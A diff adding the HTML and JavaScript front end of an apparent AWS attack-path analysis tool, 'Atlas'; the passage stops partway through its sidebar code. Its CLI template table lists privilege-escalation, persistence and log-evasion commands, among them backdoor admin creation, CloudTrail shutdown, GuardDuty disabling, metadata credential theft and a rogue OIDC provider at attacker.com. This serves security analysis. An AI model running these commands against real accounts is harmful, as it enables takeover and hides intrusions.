@@ -1,0 +1,980 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Atlas - AWS Attack Path Analysis</title>
+  <script src="https://cdn.jsdelivr.net/npm/d3@7"></script>
+  <style>
+    :root {
+      --bg-dark: #0d1117;
+      --bg-panel: #161b22;
+      --bg-hover: #21262d;
+      --border: #30363d;
+      --text: #e6edf3;
+      --text-muted: #8b949e;
+      --accent: #58a6ff;
+      --accent-dim: #388bfd;
+      --critical: #f85149;
+      --high: #f0883e;
+      --medium: #d29922;
+      --low: #3fb950;
+      --font-mono: 'JetBrains Mono', 'Fira Code', 'Consolas', monospace;
+      --font-sans: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, sans-serif;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: var(--font-sans);
+      background: var(--bg-dark);
+      color: var(--text);
+      height: 100vh;
+      overflow: hidden;
+    }
+
+    /* Toolbar */
+    .toolbar {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      padding: 8px 16px;
+      background: var(--bg-panel);
+      border-bottom: 1px solid var(--border);
+      flex-wrap: wrap;
+    }
+    .toolbar-logo {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-weight: 700;
+      font-size: 1.1rem;
+      color: var(--accent);
+    }
+    .toolbar-logo svg { width: 24px; height: 24px; }
+    .toolbar-search {
+      flex: 1;
+      min-width: 180px;
+      max-width: 280px;
+    }
+    .toolbar-search input {
+      width: 100%;
+      padding: 6px 12px;
+      background: var(--bg-dark);
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      color: var(--text);
+      font-size: 13px;
+    }
+    .toolbar-search input::placeholder { color: var(--text-muted); }
+    .toolbar-search input:focus {
+      outline: none;
+      border-color: var(--accent);
+    }
+    .toolbar-filters {
+      display: flex;
+      gap: 4px;
+      flex-wrap: wrap;
+    }
+    .toolbar-filters button {
+      padding: 4px 10px;
+      font-size: 11px;
+      font-weight: 600;
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      background: var(--bg-dark);
+      color: var(--text-muted);
+      cursor: pointer;
+    }
+    .toolbar-filters button:hover { background: var(--bg-hover); color: var(--text); }
+    .toolbar-filters button.active { border-color: var(--accent); color: var(--accent); }
+    .toolbar-filters button.critical.active { border-color: var(--critical); color: var(--critical); }
+    .toolbar-filters button.high.active { border-color: var(--high); color: var(--high); }
+    .toolbar-filters button.medium.active { border-color: var(--medium); color: var(--medium); }
+    .toolbar-filters button.low.active { border-color: var(--low); color: var(--low); }
+    .toolbar-actions {
+      display: flex;
+      gap: 8px;
+    }
+    .toolbar-actions button {
+      padding: 6px 12px;
+      font-size: 12px;
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      background: var(--bg-dark);
+      color: var(--text);
+      cursor: pointer;
+    }
+    .toolbar-actions button:hover { background: var(--bg-hover); border-color: var(--accent); }
+    .toolbar-actions button.primary { background: var(--accent); border-color: var(--accent); color: var(--bg-dark); }
+    .toolbar-actions button.primary:hover { filter: brightness(1.1); }
+    .toolbar-file-input { display: none; }
+
+    /* Main layout */
+    .main {
+      display: flex;
+      height: calc(100vh - 49px);
+    }
+    .graph-container {
+      flex: 1;
+      position: relative;
+      min-width: 0;
+    }
+    #graph-svg {
+      width: 100%;
+      height: 100%;
+      cursor: grab;
+    }
+    #graph-svg:active { cursor: grabbing; }
+
+    /* Sidebar */
+    .sidebar {
+      width: 340px;
+      min-width: 280px;
+      background: var(--bg-panel);
+      border-left: 1px solid var(--border);
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+    }
+    .sidebar-tabs {
+      display: flex;
+      border-bottom: 1px solid var(--border);
+    }
+    .sidebar-tabs button {
+      flex: 1;
+      padding: 10px 12px;
+      font-size: 12px;
+      font-weight: 500;
+      border: none;
+      background: transparent;
+      color: var(--text-muted);
+      cursor: pointer;
+      border-bottom: 2px solid transparent;
+    }
+    .sidebar-tabs button:hover { color: var(--text); }
+    .sidebar-tabs button.active { color: var(--accent); border-bottom-color: var(--accent); }
+    .sidebar-content {
+      flex: 1;
+      overflow-y: auto;
+      padding: 12px;
+    }
+    .sidebar-panel { display: none; }
+    .sidebar-panel.active { display: block; }
+
+    /* Attack Paths list */
+    .path-item {
+      padding: 10px 12px;
+      margin-bottom: 8px;
+      background: var(--bg-dark);
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      cursor: pointer;
+    }
+    .path-item:hover { border-color: var(--accent); }
+    .path-item .path-id { font-weight: 600; color: var(--accent); font-size: 12px; }
+    .path-item .path-summary { font-size: 12px; color: var(--text-muted); margin-top: 4px; }
+    .path-item .path-meta { font-size: 11px; color: var(--text-muted); margin-top: 4px; }
+
+    /* Findings list */
+    .finding-item {
+      padding: 10px 12px;
+      margin-bottom: 8px;
+      background: var(--bg-dark);
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      cursor: pointer;
+      border-left: 3px solid var(--medium);
+    }
+    .finding-item.critical { border-left-color: var(--critical); }
+    .finding-item.high { border-left-color: var(--high); }
+    .finding-item.medium { border-left-color: var(--medium); }
+    .finding-item.low { border-left-color: var(--low); }
+    .finding-item:hover { border-color: var(--accent); }
+    .finding-item .finding-title { font-size: 12px; font-weight: 500; }
+    .finding-item .finding-rule { font-size: 11px; color: var(--text-muted); margin-top: 2px; }
+
+    /* Legend */
+    .legend-section { margin-bottom: 16px; }
+    .legend-section h4 { font-size: 11px; text-transform: uppercase; color: var(--text-muted); margin-bottom: 8px; }
+    .legend-row { display: flex; align-items: center; gap: 8px; margin-bottom: 6px; font-size: 12px; }
+    .legend-dot { width: 12px; height: 12px; border-radius: 50%; }
+    .legend-dot.user { background: #58a6ff; }
+    .legend-dot.role { background: #a371f7; }
+    .legend-dot.group { background: #79c0ff; }
+    .legend-dot.policy { background: #d29922; }
+    .legend-dot.s3 { background: #3fb950; }
+    .legend-dot.lambda { background: #f0883e; }
+    .legend-dot.ec2 { background: #f85149; }
+    .legend-dot.rds { background: #db61a2; }
+    .legend-dot.kms { background: #7ee787; }
+    .legend-dot.secret { background: #ffa657; }
+    .legend-dot.default { background: var(--text-muted); }
+
+    /* Detail panel (floating) */
+    .detail-panel {
+      position: absolute;
+      bottom: 20px;
+      left: 20px;
+      width: 320px;
+      max-height: 280px;
+      background: var(--bg-panel);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 12px;
+      overflow-y: auto;
+      display: none;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.4);
+    }
+    .detail-panel.visible { display: block; }
+    .detail-panel h3 { font-size: 14px; margin-bottom: 8px; color: var(--accent); }
+    .detail-panel .detail-row { font-size: 12px; margin-bottom: 6px; }
+    .detail-panel .detail-label { color: var(--text-muted); }
+    .detail-panel .detail-arn { font-family: var(--font-mono); font-size: 11px; word-break: break-all; }
+    .detail-panel .close-btn { float: right; cursor: pointer; color: var(--text-muted); }
+
+    /* Attack Chain Analyzer modal */
+    .modal-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.6);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 1000;
+    }
+    .modal-overlay.visible { display: flex; }
+    .modal {
+      width: 90%;
+      max-width: 640px;
+      max-height: 85vh;
+      background: var(--bg-panel);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      overflow: hidden;
+      display: flex;
+      flex-direction: column;
+    }
+    .modal-header {
+      padding: 16px;
+      border-bottom: 1px solid var(--border);
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .modal-header h2 { font-size: 16px; }
+    .modal-close { cursor: pointer; color: var(--text-muted); font-size: 20px; }
+    .modal-body { padding: 16px; overflow-y: auto; flex: 1; }
+    .chain-select { width: 100%; padding: 8px 12px; margin-bottom: 16px; background: var(--bg-dark); border: 1px solid var(--border); border-radius: 6px; color: var(--text); }
+    .chain-step {
+      padding: 12px;
+      margin-bottom: 12px;
+      background: var(--bg-dark);
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      border-left: 3px solid var(--accent);
+    }
+    .chain-step .step-num { font-weight: 600; color: var(--accent); }
+    .chain-step .step-desc { font-size: 13px; margin-top: 4px; }
+    .chain-step pre {
+      margin-top: 8px;
+      padding: 10px;
+      background: var(--bg-dark);
+      border-radius: 4px;
+      font-size: 12px;
+      overflow-x: auto;
+      border: 1px solid var(--border);
+    }
+
+    /* Finding modal */
+    .finding-modal .severity-badge {
+      display: inline-block;
+      padding: 2px 8px;
+      border-radius: 4px;
+      font-size: 11px;
+      font-weight: 600;
+      margin-bottom: 12px;
+    }
+    .finding-modal .severity-badge.critical { background: var(--critical); color: #fff; }
+    .finding-modal .severity-badge.high { background: var(--high); color: #fff; }
+    .finding-modal .severity-badge.medium { background: var(--medium); color: #000; }
+    .finding-modal .severity-badge.low { background: var(--low); color: #000; }
+    .finding-modal .section { margin-bottom: 16px; }
+    .finding-modal .section h4 { font-size: 12px; color: var(--text-muted); margin-bottom: 6px; }
+    .finding-modal .section p, .finding-modal .section pre { font-size: 13px; line-height: 1.5; }
+
+    /* Empty state */
+    .empty-state {
+      text-align: center;
+      padding: 40px 20px;
+      color: var(--text-muted);
+    }
+    .empty-state p { margin-bottom: 12px; }
+    .empty-state .drop-zone {
+      border: 2px dashed var(--border);
+      border-radius: 8px;
+      padding: 24px;
+      margin-top: 16px;
+      cursor: pointer;
+    }
+    .empty-state .drop-zone:hover { border-color: var(--accent); }
+    .empty-state .drop-zone.dragover { border-color: var(--accent); background: rgba(88,166,255,0.1); }
+
+    /* Loading */
+    .loading { text-align: center; padding: 40px; color: var(--text-muted); }
+
+    /* Drag overlay */
+    body.dragover::after {
+      content: 'Drop JSON file to load';
+      position: fixed;
+      inset: 0;
+      background: rgba(88,166,255,0.15);
+      border: 3px dashed var(--accent);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 18px;
+      font-weight: 600;
+      color: var(--accent);
+      pointer-events: none;
+      z-index: 999;
+    }
+  </style>
+</head>
+<body>
+  <div class="toolbar">
+    <div class="toolbar-logo">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>
+      Atlas
+    </div>
+    <div class="toolbar-search">
+      <input type="text" id="search-input" placeholder="Search nodes...">
+    </div>
+    <div class="toolbar-filters">
+      <button class="severity-filter critical" data-sev="CRITICAL">CRITICAL</button>
+      <button class="severity-filter high" data-sev="HIGH">HIGH</button>
+      <button class="severity-filter medium" data-sev="MEDIUM">MEDIUM</button>
+      <button class="severity-filter low" data-sev="LOW">LOW</button>
+    </div>
+    <div class="toolbar-actions">
+      <button id="btn-fit">Fit</button>
+      <button id="btn-cluster">Cluster</button>
+      <button id="btn-export">Export</button>
+      <button id="btn-analyzer" class="primary">Attack Chain Analyzer</button>
+      <button id="btn-open-json">Open JSON</button>
+      <input type="file" id="file-input" class="toolbar-file-input" accept=".json">
+    </div>
+  </div>
+
+  <div class="main">
+    <div class="graph-container">
+      <svg id="graph-svg"></svg>
+      <div class="detail-panel" id="detail-panel">
+        <span class="close-btn" id="detail-close">&times;</span>
+        <h3 id="detail-title">Node Details</h3>
+        <div id="detail-content"></div>
+      </div>
+    </div>
+    <div class="sidebar">
+      <div class="sidebar-tabs">
+        <button data-tab="paths" class="active">Attack Paths</button>
+        <button data-tab="findings">Findings</button>
+        <button data-tab="legend">Legend</button>
+      </div>
+      <div class="sidebar-content">
+        <div class="sidebar-panel active" id="panel-paths">
+          <div class="empty-state" id="paths-empty">Load data to see attack paths.</div>
+          <div id="paths-list"></div>
+        </div>
+        <div class="sidebar-panel" id="panel-findings">
+          <div class="empty-state" id="findings-empty">Load data to see findings.</div>
+          <div id="findings-list"></div>
+        </div>
+        <div class="sidebar-panel" id="panel-legend">
+          <div class="legend-section">
+            <h4>Node Types</h4>
+            <div class="legend-row"><span class="legend-dot user"></span> User</div>
+            <div class="legend-row"><span class="legend-dot role"></span> Role</div>
+            <div class="legend-row"><span class="legend-dot group"></span> Group</div>
+            <div class="legend-row"><span class="legend-dot policy"></span> Policy</div>
+            <div class="legend-row"><span class="legend-dot s3"></span> S3</div>
+            <div class="legend-row"><span class="legend-dot lambda"></span> Lambda</div>
+            <div class="legend-row"><span class="legend-dot ec2"></span> EC2</div>
+            <div class="legend-row"><span class="legend-dot rds"></span> RDS</div>
+            <div class="legend-row"><span class="legend-dot kms"></span> KMS</div>
+            <div class="legend-row"><span class="legend-dot secret"></span> Secret</div>
+            <div class="legend-row"><span class="legend-dot default"></span> Other</div>
+          </div>
+          <div class="legend-section">
+            <h4>Severity</h4>
+            <div class="legend-row"><span class="legend-dot" style="background:var(--critical)"></span> Critical</div>
+            <div class="legend-row"><span class="legend-dot" style="background:var(--high)"></span> High</div>
+            <div class="legend-row"><span class="legend-dot" style="background:var(--medium)"></span> Medium</div>
+            <div class="legend-row"><span class="legend-dot" style="background:var(--low)"></span> Low</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Attack Chain Analyzer Modal -->
+  <div class="modal-overlay" id="analyzer-modal">
+    <div class="modal">
+      <div class="modal-header">
+        <h2>Attack Chain Analyzer</h2>
+        <span class="modal-close" id="analyzer-close">&times;</span>
+      </div>
+      <div class="modal-body">
+        <select class="chain-select" id="chain-select">
+          <option value="">Select identity / attack path...</option>
+        </select>
+        <div id="chain-steps"></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Finding Modal -->
+  <div class="modal-overlay" id="finding-modal">
+    <div class="modal finding-modal">
+      <div class="modal-header">
+        <h2 id="finding-modal-title">Finding</h2>
+        <span class="modal-close" id="finding-close">&times;</span>
+      </div>
+      <div class="modal-body" id="finding-modal-body"></div>
+    </div>
+  </div>
+
+  <script>
+(function() {
+  'use strict';
+
+  // AWS CLI command templates for edge types
+  const AWS_CLI_TEMPLATES = {
+    can_assume: (src, tgt) => `aws sts assume-role --role-arn "${tgt}" --role-session-name "atlas-session"`,
+    can_create_key: (src, tgt) => {
+      const user = tgt.split('/').pop();
+      return `aws iam create-access-key --user-name "${user}"`;
+    },
+    can_passrole: (src, tgt) => `aws lambda update-function-configuration --function-name <FUNCTION> --role "${tgt}"`,
+    can_passrole_ec2: (src, tgt) => `aws ec2 run-instances --iam-instance-profile Name=<PROFILE> --image-id ami-xxx`,
+    can_passrole_ecs: (src, tgt) => `aws ecs run-task --task-definition <TASK> --launch-type FARGATE`,
+    can_passrole_cloudformation: (src, tgt) => `aws cloudformation create-stack --stack-name <STACK> --template-body file://template.yaml --role-arn "${tgt}"`,
+    can_passrole_glue: (src, tgt) => `aws glue create-dev-endpoint --role-arn "${tgt}"`,
+    can_passrole_agentcore: (src, tgt) => `aws bedrock-agent create-code-interpreter --role-arn "${tgt}"`,
+    can_attach_policy: (src, tgt) => {
+      const policyArn = tgt.startsWith('arn:') ? tgt : `arn:aws:iam::ACCOUNT:policy/${tgt}`;
+      return `aws iam attach-role-policy --role-name <ROLE> --policy-arn "${policyArn}"`;
+    },
+    can_put_policy: (src, tgt) => `aws iam put-role-policy --role-name <ROLE> --policy-name <NAME> --policy-document file://policy.json`,
+    can_modify_trust: (src, tgt) => `aws iam update-assume-role-policy --role-name <ROLE> --policy-document file://trust.json`,
+    can_update_lambda: (src, tgt) => `aws lambda update-function-code --function-name <FUNCTION> --zip-file fileb://payload.zip`,
+    can_update_lambda_config: (src, tgt) => `aws lambda update-function-configuration --function-name <FUNCTION> --role "${tgt}"`,
+    can_backdoor_lambda: (src, tgt) => `aws lambda add-permission --function-name <FUNCTION> --principal "*" --action lambda:InvokeFunction`,
+    can_read_s3: (src, tgt) => {
+      const bucket = tgt.includes(':::') ? tgt.split(':::').pop() : tgt.split('/').pop();
+      return `aws s3 cp s3://${bucket}/object .`;
+    },
+    can_write_s3: (src, tgt) => {
+      const bucket = tgt.includes(':::') ? tgt.split(':::').pop() : tgt.split('/').pop();
+      return `aws s3 cp local-file s3://${bucket}/`;
+    },
+    can_read_userdata: (src, tgt) => `curl http://169.254.169.254/latest/user-data`,
+    can_ssm_session: (src, tgt) => `aws ssm start-session --target <INSTANCE_ID>`,
+    can_steal_imds_creds: (src, tgt) => `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/`,
+    can_snapshot_volume: (src, tgt) => `aws ec2 create-snapshot --volume-id <VOLUME_ID>`,
+    can_modify_userdata: (src, tgt) => `aws ec2 modify-instance-attribute --instance-id <ID> --user-data <BASE64>`,
+    can_get_ec2_password_data: (src, tgt) => `aws ec2 get-password-data --instance-id <INSTANCE_ID>`,
+    can_create_admin_user: (src, tgt) => `aws iam create-user --user-name backdoor && aws iam attach-user-policy --user-name backdoor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess`,
+    can_create_backdoor_role: (src, tgt) => `aws iam create-role --role-name backdoor --assume-role-policy-document file://trust.json`,
+    can_get_federation_token: (src, tgt) => `aws sts get-federation-token --name atlas-fed`,
+    can_modify_guardduty_detector: (src, tgt) => `aws guardduty update-detector --detector-id <ID> --enable false`,
+    can_stop_cloudtrail: (src, tgt) => `aws cloudtrail stop-logging --name <TRAIL>`,
+    can_delete_cloudtrail: (src, tgt) => `aws cloudtrail delete-trail --name <TRAIL>`,
+    can_add_user_to_group: (src, tgt) => `aws iam add-user-to-group --user-name <USER> --group-name <GROUP>`,
+    can_create_policy_version: (src, tgt) => `aws iam create-policy-version --policy-arn <ARN> --policy-document file://policy.json --set-as-default`,
+    can_set_default_policy_version: (src, tgt) => `aws iam set-default-policy-version --policy-arn <ARN> --version-id v2`,
+    can_delete_or_detach_policy: (src, tgt) => `aws iam detach-role-policy --role-name <ROLE> --policy-arn <ARN>`,
+    can_access_via_resource_policy: (src, tgt) => `# Resource policy allows access - use service-specific APIs`,
+    can_assume_via_oidc_misconfig: (src, tgt) => `# OIDC: Use external IdP (GitHub/GitLab) to assume role`,
+    can_read_codebuild_env: (src, tgt) => `aws codebuild batch-get-projects --names <PROJECT>`,
+    can_read_beanstalk_env: (src, tgt) => `aws elasticbeanstalk describe-configuration-settings --application-name <APP> --environment-name <ENV>`,
+    can_hijack_bedrock_agent: (src, tgt) => `aws bedrock-agent update-agent --agent-id <ID> --agent-name <NAME>`,
+    can_create_eventbridge_rule: (src, tgt) => `aws events put-rule --name <RULE> --schedule-expression "rate(1 hour)"`,
+    can_open_security_group_ingress: (src, tgt) => `aws ec2 authorize-security-group-ingress --group-id <SG_ID> --protocol tcp --port 22 --cidr 0.0.0.0/0`,
+    can_enable_ssm_via_tags: (src, tgt) => `aws ec2 create-tags --resources <INSTANCE> --tags Key=PatchGroup,Value=SSM`,
+    can_backdoor_ecs_task: (src, tgt) => `aws ecs register-task-definition --family <FAMILY> --task-role-arn "${tgt}"`,
+    can_steal_lambda_creds: (src, tgt) => `# Lambda SSRF/XXE to steal credentials`,
+    can_steal_ecs_task_creds: (src, tgt) => `# ECS container RCE to steal task role`,
+    can_create_eks_access_entry: (src, tgt) => `aws eks create-access-entry --cluster-name <CLUSTER> --principal-arn "${src}"`,
+    can_modify_sagemaker_lifecycle: (src, tgt) => `aws sagemaker update-notebook-instance-lifecycle-config --notebook-instance-lifecycle-config-name <NAME>`,
+    can_create_codebuild_github_runner: (src, tgt) => `aws codebuild create-project --source type=GITHUB ...`,
+    can_create_rogue_oidc_persistence: (src, tgt) => `aws iam create-open-id-connect-provider --url https://attacker.com/oidc ...`,
+    can_create_roles_anywhere_persistence: (src, tgt) => `aws rolesanywhere create-trust-anchor --name backdoor ...`,
+    can_modify_s3_acl_persistence: (src, tgt) => `aws s3api put-bucket-acl --bucket <BUCKET> --acl public-read`,
+  };
+
+  const KIND_COLORS = {
+    User: '#58a6ff', Role: '#a371f7', Group: '#79c0ff', Policy: '#d29922',
+    S3: '#3fb950', Lambda: '#f0883e', EC2: '#f85149', RDS: '#db61a2',
+    KMS: '#7ee787', Secret: '#ffa657', SSM: '#ff7b72', CFN: '#bc8cff',
+    ECS: '#56d4dd', ECR: '#8b949e', Cognito: '#f0883e', CloudFront: '#ffa657',
+    CodeBuild: '#3fb950', Beanstalk: '#79c0ff', Bedrock: '#a371f7',
+    Backup: '#8b949e', EBS: '#f85149', EFS: '#56d4dd', Account: '#58a6ff',
+    Credential: '#f85149', Resource: '#8b949e'
+  };
+
+  const EDGE_LABELS = {
+    can_assume: 'Assume Role', can_create_key: 'Create Access Key', can_passrole: 'PassRole',
+    can_attach_policy: 'Attach Policy', can_put_policy: 'Put Inline Policy',
+    can_modify_trust: 'Modify Trust', can_update_lambda: 'Update Lambda',
+    can_read_s3: 'Read S3', can_write_s3: 'Write S3', can_read_userdata: 'Read UserData',
+    can_ssm_session: 'SSM Session', can_steal_imds_creds: 'Steal IMDS Creds',
+    can_passrole_ec2: 'PassRole EC2', can_passrole_ecs: 'PassRole ECS',
+    can_passrole_cloudformation: 'PassRole CFN', can_passrole_glue: 'PassRole Glue',
+    can_passrole_agentcore: 'PassRole AgentCore', can_snapshot_volume: 'Snapshot Volume',
+    can_modify_userdata: 'Modify UserData', can_create_admin_user: 'Create Admin',
+    can_create_backdoor_role: 'Create Backdoor Role', can_get_federation_token: 'Get Fed Token',
+    can_add_user_to_group: 'Add to Group', can_create_policy_version: 'Create Policy Version',
+    can_set_default_policy_version: 'Set Default Version', can_delete_or_detach_policy: 'Detach Policy',
+    can_access_via_resource_policy: 'Resource Policy', can_assume_via_oidc_misconfig: 'OIDC Assume',
+    can_read_codebuild_env: 'Read CodeBuild Env', can_read_beanstalk_env: 'Read Beanstalk Env',
+    can_hijack_bedrock_agent: 'Hijack Bedrock Agent', can_update_lambda_config: 'Update Lambda Config',
+    can_backdoor_lambda: 'Backdoor Lambda', can_backdoor_ecs_task: 'Backdoor ECS',
+    can_steal_lambda_creds: 'Steal Lambda Creds', can_steal_ecs_task_creds: 'Steal ECS Creds',
+    can_enable_ssm_via_tags: 'Enable SSM via Tags', can_create_eventbridge_rule: 'EventBridge Rule',
+    can_open_security_group_ingress: 'Open SG Ingress', can_create_eks_access_entry: 'EKS Access',
+    can_modify_sagemaker_lifecycle: 'SageMaker Lifecycle', can_create_codebuild_github_runner: 'CodeBuild Runner',
+    can_create_rogue_oidc_persistence: 'Rogue OIDC', can_create_roles_anywhere_persistence: 'Roles Anywhere',
+    can_modify_s3_acl_persistence: 'S3 ACL', can_modify_guardduty_detector: 'Modify GuardDuty',
+    can_stop_cloudtrail: 'Stop CloudTrail', can_delete_cloudtrail: 'Delete CloudTrail',
+  };
+
+  let appData = null;
+  let graphState = { simulation: null, zoom: null, nodeById: {}, edgeById: {}, activeSeverities: new Set(['CRITICAL','HIGH','MEDIUM','LOW']) };
+
+  function shortName(arn) {
+    if (!arn) return '';
+    if (arn.includes(':::')) return arn.split(':::').pop();
+    return arn.split('/').pop() || arn.split(':').pop() || arn;
+  }
+
+  function getCliCommand(edgeKind, sourceArn, targetArn) {
+    const fn = AWS_CLI_TEMPLATES[edgeKind];
+    return fn ? fn(sourceArn, targetArn) : `# ${edgeKind}: use AWS APIs for ${shortName(sourceArn)} -> ${shortName(targetArn)}`;
+  }
+
+  function getKindColor(kind) {
+    return KIND_COLORS[kind] || KIND_COLORS.Resource;
+  }
+
+  function getEdgeLabel(kind) {
+    return EDGE_LABELS[kind] || kind.replace(/_/g, ' ');
+  }
+
+  function loadFromUrl() {
+    const params = new URLSearchParams(location.search);
+    const caseName = params.get('case');
+    if (!caseName) return Promise.resolve(null);
+    return fetch(`/api/case/${encodeURIComponent(caseName)}`).then(r => {
+      if (!r.ok) throw new Error(r.statusText);
+      return r.json();
+    });
+  }
+
+  function loadFromFile(file) {
+    return new Promise((resolve, reject) => {
+      const r = new FileReader();
+      r.onload = () => { try { resolve(JSON.parse(r.result)); } catch (e) { reject(e); } }
+      r.onerror = () => reject(new Error('Failed to read file'));
+      r.readAsText(file);
+    });
+  }
+
+  function initData(raw) {
+    const meta = raw.meta || {};
+    const graph = raw.graph || { nodes: [], edges: [] };
+    const nodes = (graph.nodes || []).map(n => ({
+      ...n,
+      id: n.id || n.arn,
+      name: n.name || shortName(n.arn || n.id),
+      kind: n.kind || 'Resource',
+      arn: n.arn || n.id,
+      risk_score: n.risk_score || 0,
+    }));
+    const nodeMap = {};
+    nodes.forEach(n => { nodeMap[n.id] = n; });
+    const edges = (graph.edges || []).map(e => {
+      const src = typeof e.source === 'object' ? e.source.id : e.source;
+      const tgt = typeof e.target === 'object' ? e.target.id : e.target;
+      return { source: src, target: tgt, kind: e.kind || '', api_actions: e.api_actions || [] };
+    }).filter(e => nodeMap[e.source] && nodeMap[e.target]);
+    const risk_findings = raw.risk_findings || [];
+    const attack_paths = raw.attack_paths || [];
+    appData = { meta, nodes, edges, risk_findings, attack_paths, nodeMap };
+    return appData;
+  }
+
+  function renderGraph() {
+    if (!appData) return;
+    const svg = d3.select('#graph-svg');
+    svg.selectAll('*').remove();
+    const width = svg.node().getBoundingClientRect().width;
+    const height = svg.node().getBoundingClientRect().height;
+    const g = svg.append('g');
+    const zoom = d3.zoom().scaleExtent([0.1, 4]).on('zoom', (ev) => g.attr('transform', ev.transform));
+    svg.call(zoom);
+    graphState.zoom = zoom;
+
+    const { nodes, edges, nodeMap } = appData;
+    const filteredNodes = nodes.filter(n => {
+      const sev = n.risk_score >= 9 ? 'CRITICAL' : n.risk_score >= 7 ? 'HIGH' : n.risk_score >= 5 ? 'MEDIUM' : 'LOW';
+      return graphState.activeSeverities.has(sev) || n.risk_score === 0;
+    });
+    const nodeIds = new Set(filteredNodes.map(n => n.id));
+    const filteredEdges = edges.filter(e => nodeIds.has(e.source) && nodeIds.has(e.target));
+
+    const linkData = filteredEdges.map(e => ({
+      ...e,
+      source: e.source,
+      target: e.target,
+    }));
+
+    const simulation = d3.forceSimulation(filteredNodes)
+      .force('link', d3.forceLink(linkData).id(d => d.id).distance(120))
+      .force('charge', d3.forceManyBody().strength(-400))
+      .force('center', d3.forceCenter(width / 2, height / 2))
+      .force('collision', d3.forceCollide().radius(40));
+
+    graphState.simulation = simulation;
+    graphState.nodeById = {};
+    filteredNodes.forEach(n => { graphState.nodeById[n.id] = n; });
+
+    const link = g.append('g').attr('class', 'links')
+      .selectAll('line')
+      .data(linkData)
+      .join('line')
+      .attr('stroke', '#30363d')
+      .attr('stroke-opacity', 0.8)
+      .attr('stroke-width', 1.5);
+
+    const linkLabels = g.append('g').attr('class', 'link-labels')
+      .selectAll('text')
+      .data(linkData)
+      .join('text')
+      .attr('font-size', 10)
+      .attr('fill', '#8b949e')
+      .text(d => getEdgeLabel(d.kind));
+
+    const node = g.append('g').attr('class', 'nodes')
+      .selectAll('g')
+      .data(filteredNodes)
+      .join('g')
+      .attr('cursor', 'pointer')
+      .call(d3.drag()
+        .on('start', (ev, d) => { ev.sourceEvent.stopPropagation(); if (!ev.active) simulation.alphaTarget(0.3).restart(); d.fx = d.x; d.fy = d.y; })
+        .on('drag', (ev, d) => { d.fx = ev.x; d.fy = ev.y; })
+        .on('end', (ev, d) => { if (!ev.active) simulation.alphaTarget(0); d.fx = null; d.fy = null; }))
+      .on('click', (ev, d) => { ev.stopPropagation(); showDetailPanel(d); });
+
+    node.append('circle')
+      .attr('r', d => (d.is_source ? 14 : 10) + Math.min(d.risk_score || 0, 5))
+      .attr('fill', d => getKindColor(d.kind))
+      .attr('stroke', d => d.is_source ? '#58a6ff' : '#30363d')
+      .attr('stroke-width', d => d.is_source ? 3 : 1);
+
+    node.append('text')
+      .attr('dy', 22)
+      .attr('text-anchor', 'middle')
+      .attr('font-size', 11)
+      .attr('fill', '#e6edf3')
+      .text(d => (d.name || '').length > 20 ? (d.name || '').slice(0, 17) + '...' : (d.name || ''));
+
+    simulation.on('tick', () => {
+      link
+        .attr('x1', d => d.source.x)
+        .attr('y1', d => d.source.y)
+        .attr('x2', d => d.target.x)
+        .attr('y2', d => d.target.y);
+      linkLabels
+        .attr('x', d => (d.source.x + d.target.x) / 2)
+        .attr('y', d => (d.source.y + d.target.y) / 2);
+      node.attr('transform', d => `translate(${d.x},${d.y})`);
+    });
+  }
+
+  function showDetailPanel(node) {
+    const panel = document.getElementById('detail-panel');
+    const title = document.getElementById('detail-title');
+    const content = document.getElementById('detail-content');
+    title.textContent = node.name || shortName(node.arn);
+    const connections = (appData?.edges || []).filter(e => e.source === node.id || e.target === node.id);
+    content.innerHTML = `
+      <div class="detail-row"><span class="detail-label">Kind: </span>${node.kind}</div>
+      <div class="detail-row"><span class="detail-label">Risk: </span>${(node.risk_score || 0).toFixed(1)}</div>
+      <div class="detail-row"><span class="detail-label">ARN: </span><span class="detail-arn">${node.arn || node.id}</span></div>
+      <div class="detail-row"><span class="detail-label">Connections: </span>${connections.length}</div>
+    `;
+    panel.classList.add('visible');
+  }
+
+  function renderSidebar() {
+    if (!appData) return;
+    const { attack_paths, risk_findings } = appData;
+    const pathsList = document.getElementById('paths-list');
+    const pathsEmpty = document.getElementById('paths-empty');
+    const findingsList = document.getElementById('findings-list');
+    const findingsEmpty = document.getElementById('findings-empty');
+
+    pathsList.innerHTML = '';
+    if (attack_paths.length === 0) {
+      pathsEmpty.style.display = 'block';
+    } else {
+      pathsEmpty.style.display = 'none';
+      attack_paths.forEach((p, i) => {
+        const el = document.createElement('div');
+        el.className = 'path-item';
+        el.innerHTML = `
+          <div class="path-id">${p.id || `AP-${i + 1}`}</div>
+          <div class="path-summary">${(p.summary || '').slice(0, 80)}${(p.summary || '').length > 80 ? '...' : ''}</div>
+          <div class="path-meta">${p.hop_count || 0} hops · cost ${p.detection_cost ?? '-'}</div>
+        `;
+        el.onclick = () => { document.getElementById('chain-select').value = p.id; updateChainSteps(); };
